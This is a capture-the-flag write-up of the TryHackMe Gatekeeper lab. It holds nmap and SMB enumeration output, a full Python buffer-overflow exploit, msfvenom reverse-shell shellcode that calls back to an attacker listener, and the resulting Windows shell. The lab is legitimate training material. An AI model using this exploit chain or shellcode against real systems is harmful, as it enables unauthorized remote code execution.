---
Can you get past the gate and through the fire?
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/8979e58d84147f0720773889be95f4d9.jpeg)

### Approach the Gates 

Deploy the machine when you are ready to release the Gatekeeper.


**Writeups will not be accepted for this challenge**

### Defeat the Gatekeeper and pass through the fire. 

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.


```
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.230.169
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 23:54 EDT
Nmap scan report for 10.10.230.169
Host is up (0.20s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2022-09-29T03:53:35
|_Not valid after:  2023-03-31T03:53:35
|_ssl-date: 2022-09-30T03:58:03+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2022-09-30T03:57:48+00:00
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.92%I=7%D=9/29%Time=63366897%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/29%OT=135%CT=1%CU=37616%PV=Y%DS=2%DC=T%G=Y%TM=633669
OS:4B%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=108%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=7)SEQ(SP=109%GCD=1%ISR=10D
OS:%TI=I%CI=I%TS=7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M50
OS:5NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=
OS:Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q
OS:=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
OS:DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 48m00s, deviation: 1h47m20s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:4f:4d:00:29:8f (unknown)
| smb2-time: 
|   date: 2022-09-30T03:57:48
|_  start_date: 2022-09-30T03:53:21
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-29T23:57:48-04:00

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   202.04 ms 10.11.0.1
2   197.15 ms 10.10.230.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.230.169

SMB Enumeration

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ smbclient -L 10.10.230.169                          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.230.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


When accessing the share using SMBClient, it appears to contain a gatekeeper.exe file, downloading it locally:


┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ smbclient \\\\10.10.230.169\\Users
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3876815 blocks available
smb: \> cd share
smb: \share\> dir
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3876815 blocks available
smb: \share\> get gatekeeper.exe
getting file \share\gatekeeper.exe of size 13312 as gatekeeper.exe (12.1 KiloBytes/sec) (average 12.1 KiloBytes/sec)
smb: \share\> exit


Exploiting Buffer Overflow

Interacting with the service on port 31337 – it looks like it asks for a user input and then it prints it with “hello [input]!!!”

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nc 10.10.230.169 31337     
test
Hello test!!!
witty
Hello witty!!!
^C

again pass the file to immunity debugger and using mona

using machine from buffer overflow prep

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ xfreerdp /u:'admin' /p:'password' /v:10.10.230.169 /size:85%

getting gatekeeper.exe to analyze with immunity debugger and mona to buffer overflow

──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.198.7 - - [30/Sep/2022 00:12:09] "GET / HTTP/1.1" 200 -
10.10.198.7 - - [30/Sep/2022 00:12:10] code 404, message File not found
10.10.198.7 - - [30/Sep/2022 00:12:10] "GET /favicon.ico HTTP/1.1" 404 -
10.10.198.7 - - [30/Sep/2022 00:12:44] "GET /gatekeeper.exe HTTP/1.1" 200 -

http://10.11.81.220:8000/

download gatekeeper.exe

Generating a 300-byte long string of A characters to test the overflow:

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python2                                                                   
Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
[GCC 12.1.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print "A" * 300
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>>> exit()

Sending the 300 bytes of data to the service on port 31337:


                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nc 10.10.230.169 31337
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Ncat: Connection reset by peer.

The application crashed with an access violation error

The next step required is to identify which part of the buffer that is being sent is landing in the EIP register, in order to control the execution flow. Using the msf-pattern_create tool to create a string of 300 bytes.

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msf-pattern_create -l 300                                                                  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9


┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py              
import socket

ip = "10.10.78.123"
port = 31337

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


then run the exploit script and go to immunity debugger you will see the program has been crashed

then copy the EIP address and go to terminal again to calculate the offset


EIP to get the offset for exploit.py

EIP 39654138

in option -l i put the byte size i generated and in -q option i i put the Eip address

msf-pattern_offset -l 300 -q 39654138

                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msf-pattern_offset -l 300 -q 39654138
[*] Exact match at offset 146

so offset is 46

Good i get the offset then go to exploit script again and change the offset variable from 0 to 146

and confirm the overwrite by change the padding variable to BBBB and delete any values in payload variable

restart the program in immunity by pressing ctrl + f2 and f9 twice

and run the exploit script again


┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.78.123"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = ""
padding = "BBBB"
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.78.123"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


in normal you will see in EIP register the value is 41414141 this for we send A but now you will see the EIP value is 42424242 because we added the BBBB over the offset

the next step get the bad character (this character make problems during the payload running to lead attack failed to get reverse shell)

i will use mona module then make working dir to mona by this command

!mona config -set workingfolder c:\mona\%p


!mona findmsp -distance 300

in immunity i will run this command to generate list of bad chars from {\x01 to \xff} \x00 char it is bad by default

!mona bytearray -b "\x00"

and run this script in your terminal to generate the bad chars

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ nano badchar.py
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python3 badchar.py
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat badchar.py
for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')
print()

copy the bad chars list and go to exploit script and put it in payload variable

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.78.123"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")




now restart the program in immunity by pressing ctrl + f2 and f9 twice

then run the exploit script

the program it will crash again ok now i will get the bad chars by tow methods

the first method by go to ESP register and right click and choose follow in dump

!mona compare -f C:\mona\oscp\bytearray.bin -a 016A19F8


you will get the bad chars is \x00 and \x0a

ok now we will Finding a Jump Point this point haven’t any protection and we will redirect to my shell code

using this command

!mona jmp -r esp -cpb "\x00\x0a"

now i will write the address reversely

the address is 0x080414c3 you should write \xc3\x14\x04\x08

and added in retn variable in exploit script

ok now generate the payload to gain the reverse shell

i will use msfvenom


┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=4444 -b "\x00\xa" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x1f\xc8\xa2\xbd\x83\xee\xfc\xe2\xf4\xe3\x20\x20\xbd"
"\x1f\xc8\xc2\x34\xfa\xf9\x62\xd9\x94\x98\x92\x36\x4d\xc4"
"\x29\xef\x0b\x43\xd0\x95\x10\x7f\xe8\x9b\x2e\x37\x0e\x81"
"\x7e\xb4\xa0\x91\x3f\x09\x6d\xb0\x1e\x0f\x40\x4f\x4d\x9f"
"\x29\xef\x0f\x43\xe8\x81\x94\x84\xb3\xc5\xfc\x80\xa3\x6c"
"\x4e\x43\xfb\x9d\x1e\x1b\x29\xf4\x07\x2b\x98\xf4\x94\xfc"
"\x29\xbc\xc9\xf9\x5d\x11\xde\x07\xaf\xbc\xd8\xf0\x42\xc8"
"\xe9\xcb\xdf\x45\x24\xb5\x86\xc8\xfb\x90\x29\xe5\x3b\xc9"
"\x71\xdb\x94\xc4\xe9\x36\x47\xd4\xa3\x6e\x94\xcc\x29\xbc"
"\xcf\x41\xe6\x99\x3b\x93\xf9\xdc\x46\x92\xf3\x42\xff\x97"
"\xfd\xe7\x94\xda\x49\x30\x42\xa0\x91\x8f\x1f\xc8\xca\xca"
"\x6c\xfa\xfd\xe9\x77\x84\xd5\x9b\x18\x37\x77\x05\x8f\xc9"
"\xa2\xbd\x36\x0c\xf6\xed\x77\xe1\x22\xd6\x1f\x37\x77\xed"
"\x4f\x98\xf2\xfd\x4f\x88\xf2\xd5\xf5\xc7\x7d\x5d\xe0\x1d"
"\x35\xd7\x1a\xa0\xa8\xb6\x4e\x14\xca\xbf\x1f\xd9\xfe\x34"
"\xf9\xa2\xb2\xeb\x48\xa0\x3b\x18\x6b\xa9\x5d\x68\x9a\x08"
"\xd6\xb1\xe0\x86\xaa\xc8\xf3\xa0\x52\x08\xbd\x9e\x5d\x68"
"\x77\xab\xcf\xd9\x1f\x41\x41\xea\x48\x9f\x93\x4b\x75\xda"
"\xfb\xeb\xfd\x35\xc4\x7a\x5b\xec\x9e\xbc\x1e\x45\xe6\x99"
"\x0f\x0e\xa2\xf9\x4b\x98\xf4\xeb\x49\x8e\xf4\xf3\x49\x9e"
"\xf1\xeb\x77\xb1\x6e\x82\x99\x37\x77\x34\xff\x86\xf4\xfb"
"\xe0\xf8\xca\xb5\x98\xd5\xc2\x42\xca\x73\x52\x08\xbd\x9e"
"\xca\x1b\x8a\x75\x3f\x42\xca\xf4\xa4\xc1\x15\x48\x59\x5d"
"\x6a\xcd\x19\xfa\x0c\xba\xcd\xd7\x1f\x9b\x5d\x68";


last exploit.py

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ cat exploit.py
import socket

ip = "10.10.118.64"
port = 31337

#prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x1f\xc8\xa2\xbd\x83\xee\xfc\xe2\xf4\xe3\x20\x20\xbd"
"\x1f\xc8\xc2\x34\xfa\xf9\x62\xd9\x94\x98\x92\x36\x4d\xc4"
"\x29\xef\x0b\x43\xd0\x95\x10\x7f\xe8\x9b\x2e\x37\x0e\x81"
"\x7e\xb4\xa0\x91\x3f\x09\x6d\xb0\x1e\x0f\x40\x4f\x4d\x9f"
"\x29\xef\x0f\x43\xe8\x81\x94\x84\xb3\xc5\xfc\x80\xa3\x6c"
"\x4e\x43\xfb\x9d\x1e\x1b\x29\xf4\x07\x2b\x98\xf4\x94\xfc"
"\x29\xbc\xc9\xf9\x5d\x11\xde\x07\xaf\xbc\xd8\xf0\x42\xc8"
"\xe9\xcb\xdf\x45\x24\xb5\x86\xc8\xfb\x90\x29\xe5\x3b\xc9"
"\x71\xdb\x94\xc4\xe9\x36\x47\xd4\xa3\x6e\x94\xcc\x29\xbc"
"\xcf\x41\xe6\x99\x3b\x93\xf9\xdc\x46\x92\xf3\x42\xff\x97"
"\xfd\xe7\x94\xda\x49\x30\x42\xa0\x91\x8f\x1f\xc8\xca\xca"
"\x6c\xfa\xfd\xe9\x77\x84\xd5\x9b\x18\x37\x77\x05\x8f\xc9"
"\xa2\xbd\x36\x0c\xf6\xed\x77\xe1\x22\xd6\x1f\x37\x77\xed"
"\x4f\x98\xf2\xfd\x4f\x88\xf2\xd5\xf5\xc7\x7d\x5d\xe0\x1d"
"\x35\xd7\x1a\xa0\xa8\xb6\x4e\x14\xca\xbf\x1f\xd9\xfe\x34"
"\xf9\xa2\xb2\xeb\x48\xa0\x3b\x18\x6b\xa9\x5d\x68\x9a\x08"
"\xd6\xb1\xe0\x86\xaa\xc8\xf3\xa0\x52\x08\xbd\x9e\x5d\x68"
"\x77\xab\xcf\xd9\x1f\x41\x41\xea\x48\x9f\x93\x4b\x75\xda"
"\xfb\xeb\xfd\x35\xc4\x7a\x5b\xec\x9e\xbc\x1e\x45\xe6\x99"
"\x0f\x0e\xa2\xf9\x4b\x98\xf4\xeb\x49\x8e\xf4\xf3\x49\x9e"
"\xf1\xeb\x77\xb1\x6e\x82\x99\x37\x77\x34\xff\x86\xf4\xfb"
"\xe0\xf8\xca\xb5\x98\xd5\xc2\x42\xca\x73\x52\x08\xbd\x9e"
"\xca\x1b\x8a\x75\x3f\x42\xca\xf4\xa4\xc1\x15\x48\x59\x5d"
"\x6a\xcd\x19\xfa\x0c\xba\xcd\xd7\x1f\x9b\x5d\x68")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
└─$ python exploit.py
Sending evil buffer...
Done!



┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.118.64.
Ncat: Connection from 10.10.118.64:49212.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat


C:\Users\natbat\Desktop>more user.txt.txt
more user.txt.txt
